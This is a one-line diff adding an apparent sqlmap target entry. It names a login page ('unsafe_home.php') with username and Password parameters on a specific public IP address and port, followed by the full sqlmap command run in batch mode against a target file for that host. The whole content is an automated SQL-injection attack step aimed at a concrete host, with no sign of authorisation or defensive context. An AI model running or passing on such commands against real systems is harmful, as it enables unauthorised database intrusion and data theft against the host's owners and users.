@@ -1,0 +1,1 @@
+http://171.244.21.38:4503/unsafe_home.php?Password=1&username=1 (GET)  # /snap/sqlmap/36/bin/sqlmap --batch --output-dir .temp/sqli/ -m .temp/sqlmap_171.244.21.38:4503.txt --flush-session
